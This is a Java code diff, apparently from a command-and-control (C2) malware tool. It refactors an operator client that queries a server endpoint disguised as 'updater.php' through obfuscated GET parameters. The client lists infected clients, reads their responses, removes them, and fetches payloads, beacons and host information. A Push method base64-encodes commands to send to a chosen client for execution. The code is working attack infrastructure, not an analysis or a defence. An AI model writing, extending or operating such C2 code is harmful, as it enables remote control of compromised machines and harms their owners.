@@ -5,19 +5,42 @@ import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.time.Duration;
+import java.util.HashMap;
 import java.util.Objects;
 import java.util.Base64;
 
 public class RequestCalls {
     private final HttpClient client;
     private final String hostIP;
+    private final String port;
     private final String baseEndPoint;
-    public RequestCalls(String hostIP){
+    private final HashMap<String, String> queryToParam;
+    public RequestCalls(String hostIP, String port){
         client = HttpClient.newHttpClient();
+        // Map a C2 query it's GET parameter
+        this.queryToParam = new HashMap<>();
+        queryToParam.put("FINDCLIENTS","?OYNsOOhC7L=pings");
+        queryToParam.put("FINDCLIENTRESPONSES","?OYNsOOhC7L=responses");
+        queryToParam.put("FINDCLIENTRESPONSE","?OYNsOOhC7L=");
+        queryToParam.put("REMOVECLIENT","?r8ojR2jJ=");
+        queryToParam.put("GETLASTPING","?l4St=");
+        queryToParam.put("GETPAYLOAD","?g3tp4y=");
+        queryToParam.put("GETBEACON","?g3tb34c=");
+        queryToParam.put("GETHOST","?g3th0sT=");
+        queryToParam.put("GETINFO","?lnf0=");
         this.hostIP = hostIP;
-        this.baseEndPoint = "http://"+hostIP+"/updater.php";
+        this.port = port;
+        this.baseEndPoint = "http://"+hostIP+":"+port+"/updater.php";
     }
-    public String findClients(int OS) throws IOException, InterruptedException {
+    public String queryBackend(String query, String param, int OS) throws IOException, InterruptedException {
+        HttpResponse<String> resp = sendGET(queryToParam.get(query)+param, OS);
+        if(resp.statusCode()>399){
+            return "Couldn't reach. Firewall issue?";
+        }else{
+            return Objects.equals(resp.body(), "") ? "None" : resp.body();
+        }
+    }
+    /*public String findClients(int OS) throws IOException, InterruptedException {
         HttpResponse<String> resp = sendGET("?OYNsOOhC7L=pings", OS);
         if(resp.statusCode()>399){
             return "Couldn't reach. Firewall issue?";
@@ -32,7 +55,7 @@ public class RequestCalls {
         }else{
             return Objects.equals(resp.body(), "") ? "None" : resp.body();
         }
-    }
+    }*/
     /*public String findClientReads() throws IOException, InterruptedException {
         HttpResponse<String> resp = sendGET("?OYNsOOhC7L=reads");
         if(resp.statusCode()>399){
@@ -41,7 +64,7 @@ public class RequestCalls {
             return Objects.equals(resp.body(), "") ? "None" : resp.body();
         }
     }*/
-    public String findClientResponses(int OS) throws IOException, InterruptedException {
+    /*public String findClientResponses(int OS) throws IOException, InterruptedException {
         HttpResponse<String> resp = sendGET("?OYNsOOhC7L=responses", OS);
         if(resp.statusCode()>399){
             return "Couldn't reach. Firewall issue?";
@@ -117,7 +140,7 @@ public class RequestCalls {
             //System.out.println(resp.body());
             return Objects.equals(resp.body(), "1") ? "None" : resp.body();
         }
-    }
+    }*/
     public String Push(String command, String cli, int OS) throws IOException, InterruptedException {
         String encoded = Base64.getEncoder().encodeToString(command.getBytes(StandardCharsets.UTF_8));
         String requestBody = "bm6UqYw7fq="+encoded+"&cli="+cli;
